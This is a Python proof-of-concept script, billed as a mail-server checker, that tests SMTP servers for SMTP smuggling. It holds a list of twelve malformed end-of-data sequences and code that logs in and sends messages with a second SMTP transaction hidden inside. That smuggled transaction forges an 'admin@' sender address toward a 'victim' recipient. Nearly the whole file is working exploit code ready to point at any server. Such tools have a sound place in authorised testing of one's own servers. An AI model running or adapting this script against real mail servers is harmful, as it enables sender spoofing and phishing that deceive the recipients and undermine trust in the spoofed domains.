#! /usr/bin/env python3
#
# ---------------------------------------------------------------------------------------------------------------
#    _____  __  ___ ______ ____     _____                                  __               ____   ____   ______
#   / ___/ /  |/  //_  __// __ \   / ___/ ____ ___   __  __ ____ _ ____ _ / /___   _____   / __ \ / __ \ / ____/
#   \__ \ / /|_/ /  / /  / /_/ /   \__ \ / __ `__ \ / / / // __ `// __ `// // _ \ / ___/  / /_/ // / / // /     
#  ___/ // /  / /  / /  / ____/   ___/ // / / / / // /_/ // /_/ // /_/ // //  __// /     / ____// /_/ // /___   
# /____//_/  /_/  /_/  /_/       /____//_/ /_/ /_/ \__,_/ \__, / \__, //_/ \___//_/     /_/     \____/ \____/   
#                                                        /____/ /____/                                          
#
# SMTP Smuggler PoC Script v0.1 for checking mailservers - 2024 - by suuhmer
#
# ---------------------------------------------------------------------------------------------------------------
#
# SMTP_SMUGGLER_POC Checker v0.1 
# All rights reserved - (c) 2024 - suuhmer
#
# ---------------------------------------------------------------------------------------------------------------
#

import socket
import ssl
import base64
import argparse
import getpass
import time
import smtplib
import email.utils

#
# GLOBAL VARS AND SETTINGS:
# --------------------------
email_subject = 'Subject: Your Subject'
email_body_one = 'Here is the text of your email'
admin_from = 'admin@mymailserver.com'
end_of_data_command = '\r\n.\r\n'

smtp_smuggle_escapes = [
    '\r\n.\r',
    '\r.\r',
    '\r\n\x00.\r',
    '\r\n\x00.\n',
    '\r\n\x00.\r\n',
    '\r\n.\x00\r\n',
    '\r\n.',
    '\n.\r\n',
    '\r.\r\n',
    '\n\n.\r\n',
    '\r\n.\r',
    '\n.\n'
]


smtp_test_nr = 0

# -------------------------------------------------


def __list_eod():
    print(
    """\
    Smugggling Strings (0-11):
    --------------------------

    0 - smtp_smuggle_escape =  {!r}
    1 - smtp_smuggle_escape =  {!r}
    2 - smtp_smuggle_escape =  {!r}
    3 - smtp_smuggle_escape =  {!r}
    4 - smtp_smuggle_escape =  {!r}
    5 - smtp_smuggle_escape =  {!r}
    6 - smtp_smuggle_escape =  {!r}
    7 - smtp_smuggle_escape =  {!r}
    8 - smtp_smuggle_escape =  {!r}
    9 - smtp_smuggle_escape =  {!r}
    10 - smtp_smuggle_escape = {!r}
    11 - smtp_smuggle_escape = {!r}
    """.format(
        '\r\n.\r', '\r.\r', '\r\n\x00.\r', '\r\n\x00.\n',
        '\r\n\x00.\r\n', '\r\n.\x00\r\n', '\r\n.', '\n.\r\n',
        '\r.\r\n', '\n\n.\r\n', '\r\n.\r', '\n.\n'
        ))

    import sys
    sys.exit(0)


def __local_t(dt):
    if dt == 1:
        return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    elif dt == 2:
        return email.utils.formatdate(time.time())


def get_mx_records(domain):
    try:
        import dns.resolver
        # pip install -r requirements.txt 
        try:
            mx_records = dns.resolver.resolve(domain, 'MX')
            first_mx_record = sorted(mx_records, key=lambda x: x.preference)[0].exchange
            all_mx_records = [mx.exchange.to_text() for mx in mx_records]
            print(f'[*] MX Records found:\n    {all_mx_records}\n    Using first: {first_mx_record}')
            return str(first_mx_record)
        except dns.resolver.NoAnswer:
            return domain
    except ModuleNotFoundError as e:
        print(f'{e} - Try Socket IP Request:\n')
        try:
            addresses = socket.getaddrinfo(domain, None, socket.AF_INET, socket.SOCK_STREAM)
            mx_records = [addr[4][0] for addr in addresses if addr[1] == socket.SOCK_STREAM]
            print(f'[*] MX Records found:\n    {mx_records}\n    Using first: {mx_records[0]}')
            return mx_records[0] if mx_records else None
        except socket.gaierror as ee:
            return f"[!] Error getting mx record: {ee}"


def resolve_domainname(server):
    try:
        domain_name = server
        info = socket.getaddrinfo(domain_name, None)
        server = info[0][4][0]
        print(f'\n[*] Try to resolve {domain_name} to ip: {server}')
    except socket.gaierror as e:
        import sys
        print(f'Error by domain resolve: {domain_name}: {e}')
        sys.exit(0)


def is_reachable(mx_1, port):
    try:
        socket.create_connection((mx_1, port), timeout=5)
        #return True
    except (socket.timeout, socket.error):
        import sys
        #return False
        print(f'\n[!] Error by domain resolve: {mx_1} Port {port} seems down?!')
        sys.exit(0)


def is_ip(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True  # ipv4
    except socket.error:
        try:
            socket.inet_pton(socket.AF_INET6, ip)
            return True  # ipv6
        except socket.error:
            return False


def serv_to_email(server):
    try:
        if is_ip(server):
            #
            # ip_address = socket.gethostbyname(server)
            #
            # Try reverse dns lookup:
            try:
                domain_name, _, _ = socket.gethostbyaddr(server)
                return serv_to_email(domain_name)
                #return f"admin@{domain_name}"
            except socket.herror:
                print(f"\n[!] Cannot get hostname, using dummy from-mail: {admin_from} ...")
                return None
        else:
            raise socket.gaierror()
    
    except socket.gaierror:
        # Get only domain if subdomain:
        parts = server.split('.')
        if len(parts) >= 2:
            return f"admin@{parts[-2]}.{parts[-1]}"
        else:
            return f"admin@{server}"


#
# RAW SOCKET
# ----------
#
def send_smtp_command(command, sock, noresp=False):
    cmd = (command + '\r\n').encode('utf-8')
    print('[SEND] >> ' + str(cmd))
    sock.send(cmd)
    time.sleep(1)
    response = sock.recv(1024).decode('utf-8')
    if not noresp:
        print('[RESP] << ' + response)
    return response


def send_socket_raw_mail(server, port, username, password, rcpt, smtp_smuggle_escape, force_tls):
    with socket.create_connection((server, port)) as wsock:

        # SMTPEHLO *1
        ehlo_command = f'EHLO client.{server}'
        print(f'[+] Send command {ehlo_command}')
        send_smtp_command(ehlo_command, wsock, False)
        time.sleep(0.5)

        if port == 587 or port == 443 or port == 465 or force_tls == True:
            print(f'\n[*] STARTTLS-Handshake using domain and port: {server}:{port}')
            starttls_command = 'STARTTLS'
            send_smtp_command(starttls_command, wsock)
            time.sleep(0.8)

            # SSL/TLS-Handshake
            # -----------------
            # Python 2 - 3.1 ssl Handshake:
            # -----------------------------
            #context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            #context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1

            #context = ssl.create_default_context()
            context = ssl._create_stdlib_context()
            #context.minimum_version = ssl.TLSVersion.TLSv1_2
            #context.maximum_version = ssl.TLSVersion.TLSv1_2
            #context.check_hostname = False

            # TLSv1.3 with cipher TLS_AES_256_GCM_SHA384
            #context.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384')
            #context.set_ciphers(DEFAULT_CIPHERS)

            with context.wrap_socket(wsock, server_hostname=server) as sock:
                print('[:D] EHLO')
                ehlo_command = f'EHLO client.{server}'
                print(f'[+] Send command {ehlo_command}')
                send_smtp_command(ehlo_command, sock, True)
                time.sleep(0.6)

                #print(f'[*] Auth with {username} and {password} AUTH PLAIN')
                print(f'[*] Auth with {username} (AUTH PLAIN)\n')
                auth_data = "\0{}\0{}".format(username, password)
                auth_command = 'AUTH PLAIN {}'.format(base64.b64encode(auth_data.encode()).decode())
                #print(auth_command)
                send_smtp_command(auth_command, sock)
                time.sleep(0.6)

                #Additional RFC headers:
                #mdate = email.utils.format_datetime(__local_t(2))
                mdate = __local_t(2)
                mqueue_1 = email.utils.make_msgid(domain=server)
                mqueue_2 = email.utils.make_msgid(domain=server)

                print('[*] Mail sending...')
                mail_from_command = f'MAIL FROM: {username}'
                send_smtp_command(mail_from_command, sock)
                time.sleep(0.4)

                rcpt_to_command = f'RCPT TO: {rcpt}'
                send_smtp_command(rcpt_to_command, sock)
                time.sleep(0.5)

                data_command = 'DATA'
                send_smtp_command(data_command, sock)
                time.sleep(0.4)

                #manual_input = f'{email_subject}\r\n{email_body}\r\n{end_of_data_command}'
                manual_input = f"""\
From: Me <{username}>\r\n\
To: You <{rcpt}>\r\n\
{email_subject} <{smtp_test_nr}>\r\n\
Date: {mdate}\r\n\
Message-ID: {mqueue_1}\r\n\
{email_body_one}\
{smtp_smuggle_escape}
mail From: {admin_from}\r\n\
rcpt To: {rcpt}\r\n\
data\r\n\
From: admin <{admin_from}>\r\n\
To: rcptuser <{rcpt}>\r\n\
Subject: Hello_admin <{smtp_test_nr}>\r\n\
Date: {mdate}\r\n\
Message-ID: {mqueue_2}\r\n\
hello got my foo\r\n\
\r\n.\r\n\
"""

                send_smtp_command(manual_input, sock)
                
                quit_command = 'QUIT'
                send_smtp_command(quit_command, sock)


        elif port == 25 or port == 2525 or port == 5870000:
            # FALLBACK NOSSL ON LOCAL 587 TESTING:
            if port == 5870000:
                port = 587

            with socket.create_connection((server, port)) as sock:
                print(f'\n[*] Connection using domain and port: {server}:{port}')
                ehlo_command = f'EHLO client.{server}'
                print(f'[+] Send command {ehlo_command}')
                send_smtp_command(ehlo_command, sock, True)
                #time.sleep(2.7)

                auth_data = "\0{}\0{}".format(username, password)
                print(f'[*] Auth with {username} (AUTH PLAIN)\n')
                auth_command = 'AUTH PLAIN {}'.format(base64.b64encode(auth_data.encode()).decode())
                #auth_command = 'AUTH LOGIN {}'.format(base64.b64encode(auth_data.encode()).decode())
                #print(auth_command)
                send_smtp_command(auth_command, sock)
                time.sleep(0.8)

                #Additional RFC headers:
                mdate = __local_t(2)
                mqueue_1 = email.utils.make_msgid(domain=server)
                mqueue_2 = email.utils.make_msgid(domain=server)

                print('[*] Mail sending...')
                mail_from_command = f'MAIL FROM: {username}'
                send_smtp_command(mail_from_command, sock)
                time.sleep(0.2)

                rcpt_to_command = f'RCPT TO: {rcpt}'
                send_smtp_command(rcpt_to_command, sock)
                time.sleep(0.2)

                data_command = 'DATA'
                send_smtp_command(data_command, sock)

                # manual_input = (
                #                 f'From: Me <{username}>\r\n' +
                #                 f'To: You <{rcpt}>\r\n' +
                #                 f'{email_subject} - Sequence: (test)\r\n' +
                #                 email_body_one +
                #                 smtp_smuggle_escape +
                #                 f'mail From: {admin_from}\r\n' +
                #                 f'rcpt To: {rcpt}\r\n' +
                #                 'data\r\n' +
                #                 f'From: admin <{admin_from}>\r\n' +
                #                 f'To: rcptuser <{rcpt}>\r\n' +
                #                 'Subject: Hello call me admin\r\n' +
                #                 'got it foo' +
                #                 '\r\n.'
                #                 )

                manual_input = f"""\
From: Me <{username}>\r\n\
To: You <{rcpt}>\r\n\
{email_subject} <{smtp_test_nr}>\r\n\
Date: {mdate}\r\n\
Message-ID: {mqueue_1}\r\n\
{email_body_one}\
{smtp_smuggle_escape}
mail From: {admin_from}\r\n\
rcpt To: {rcpt}\r\n\
data\r\n\
From: admin <{admin_from}>\r\n\
To: rcptuser <{rcpt}>\r\n\
Subject: Hello_admin <{smtp_test_nr}>\r\n\
Date: {mdate}\r\n\
Message-ID: {mqueue_2}\r\n\
hello got my foo\r\n\
\r\n.\r\n\
"""

                send_smtp_command(manual_input.rstrip("\n"), sock)
                
                quit_command = 'QUIT'
                send_smtp_command(quit_command, sock)

        else:

            import sys
            print('[!] Port not supported yet or no mailserver conform')
            sys.exit(0)



def send_mail(smtp_server, port, username, password, rcpt, smtp_smuggle_escape ,sdebug=True):

    context = ssl.create_default_context()

    with smtplib.SMTP(smtp_server, port) as server:
        #Debugging
        if sdebug == True:
            server.set_debuglevel(1)
        else:
            server.set_debuglevel(0)

        server.starttls(context=context)
        server.ehlo()

        # Login / Auth:
        #Debugging purposes only:
        #print(f'[*] Auth with {username} and {password} AUTH PLAIN')
        print(f'[*] Auth with {username} (AUTH PLAIN)\n')
        auth_plain = base64.b64encode(f'\0{username}\0{password}'.encode()).decode()
        try:
            server.docmd('AUTH', 'PLAIN ' + auth_plain)
        except Exception as e:
            print(f"[!] login failed:: {e}")


        print('[*] Mail sending...')
        #mail_from_command = f'MAIL FROM: {username}'
        server.mail(username)

        #Additional RFC headers:
        mdate = __local_t(2)
        mqueue_1 = email.utils.make_msgid(domain=smtp_server)
        mqueue_2 = email.utils.make_msgid(domain=smtp_server)

        #rcpt_to_command = f'RCPT TO: {rcpt}'
        server.rcpt(rcpt)

        data_command = 'DATA'
        
        #manual_input = f'{email_subject}\r\n{email_body}\r\n{end_of_data_command}'
        # manual_input = (
        #                 'DATA\r\n' +
        #                 f'From: Me <{username}>\r\n' +
        #                 f'To: You <{rcpt}>\r\n' +
        #                 f'{email_subject} - Sequence: ({smtp_smuggle_escape})\r\n' +
        #                 email_body_one +
        #                 smtp_smuggle_escape +
        #                 f'mail From: {admin_from}\r\n' +
        #                 f'rcpt To: {rcpt}\r\n' +
        #                 'data\r\n' +
        #                 f'From: admin <{admin_from}>\r\n' +
        #                 f'To: rcptuser <{rcpt}>\r\n' +
        #                 'Subject: Hello call me admin\r\n' +
        #                 'got it foo'
        #                 )
        manual_input = f"""\
DATA\r\n\
From: Me <{username}>\r\n\
To: You <{rcpt}>\r\n\
{email_subject} <{smtp_test_nr}>\r\n\
Date: {mdate}\r\n\
Message-ID: {mqueue_1}\r\n\
{email_body_one}\
{smtp_smuggle_escape}
mail From: {admin_from}\r\n\
rcpt To: {rcpt}\r\n\
data\r\n\
From: admin <{admin_from}>\r\n\
To: rcptuser <{rcpt}>\r\n\
Subject: Hello_admin <{smtp_test_nr}>\r\n\
Date: {mdate}\r\n\
Message-ID: {mqueue_2}\r\n\
hello got my foo\r\n\
\r\n.\r\n\
"""

        bytes_input = manual_input.encode('utf-8')
        #server.sendmail(mail_from_command, rcpt_to_command, bytes_input)
        server.send(manual_input)
        print("\n")
        server.quit()



def main():

    banner = """
       _____  __  ___ ______ ____     _____                                  __               ____   ____   ______
      / ___/ /  |/  //_  __// __ \   / ___/ ____ ___   __  __ ____ _ ____ _ / /___   _____   / __ \ / __ \ / ____/
      \__ \ / /|_/ /  / /  / /_/ /   \__ \ / __ `__ \ / / / // __ `// __ `// // _ \ / ___/  / /_/ // / / // /     
     ___/ // /  / /  / /  / ____/   ___/ // / / / / // /_/ // /_/ // /_/ // //  __// /     / ____// /_/ // /___   
    /____//_/  /_/  /_/  /_/       /____//_/ /_/ /_/ \__,_/ \__, / \__, //_/ \___//_/     /_/     \____/ \____/   
                                                           /____/ /____/                                          
    
    SMTP Smuggle PoC Script v0.1 for checking mailservers - 2024 - by suuhmer

    """
    print(banner)


    # Server and Port of (local) E/SMTP-Servers:
    # Default localhost:587 TLS.
    #
    sserver = '127.0.0.1'
    sport = 587
    #sserver = 'mail.servername.com'
    #sport = 25

    susername = 'info@myservername.local'
    spassword = 'CHANGE_ME'
    srcpt = 'victim@myservername.local'


    parser = argparse.ArgumentParser(description='Test you mailserver for SMTP Smuggle /w STARTTLS und AUTH PLAIN login.')
    parser.add_argument('--server', type=str, default=sserver, required=False, help='SMTP-(Servername, Domain or IP')
    parser.add_argument('--port', type=int, default=sport, required=False, help='SMTP-Serverport (Use 5870000 for 587 NOSSL-FALLBACK)')
    parser.add_argument('--user', type=str, default=susername, required=False, help='SMTP-userername')
    parser.add_argument('--rcpt', type=str, default=srcpt, required=False, help='rcpt address')
    parser.add_argument('--mode', type=str, default='def', help='Rawmode = raw or Default = def')
    parser.add_argument('--forcetls', default=None, action="store_true", required=False, help="Force connection via SSL/TLS")
    parser.add_argument('--listeod', default=None, action="store_true", required=False, help="Lists end of data sequences")
    args = parser.parse_args()

    if args.listeod: __list_eod()

    password = getpass.getpass(prompt='Enter password: ')
    #For static pw testing. Risky! ;)
    #password = spassword

    server = args.server
    port = args.port
    username = args.user
    rcpt = args.rcpt
    force_tls=args.forcetls

    global smtp_test_nr
    global admin_from
    admin_from = serv_to_email(server)

    # Chcking for reachable and domain resolving stuff:
    #
    #resolve_domainname(server)
    mx_1 = get_mx_records(server)
    is_reachable(mx_1, port)

    for es in smtp_smuggle_escapes:
        print(f"""
    --- ---------------------------------------------------------------------------
    [{smtp_test_nr}] Trying to smuggle {admin_from} /w escape payload: <{repr(es)}>
        Time: ({__local_t(1)})
    --- ---------------------------------------------------------------------------
    """)
        time.sleep(1.1)

        if args.mode == 'def':
            try:
                send_mail(server, port, username, password, rcpt, es, True)
                print('E-Mail successfully sent.')
                smtp_test_nr+=1
        
            except Exception as e:
                print(f"Error sending: {e}")

        elif args.mode == 'raw':
            try:
                send_socket_raw_mail(server, port, username, password, rcpt, es, force_tls)
                print('E-Mail successfully sent.')
                smtp_test_nr+=1
        
            except Exception as e:
                print(f"Error sending: {e}")

        

if __name__ == "__main__":
    main()
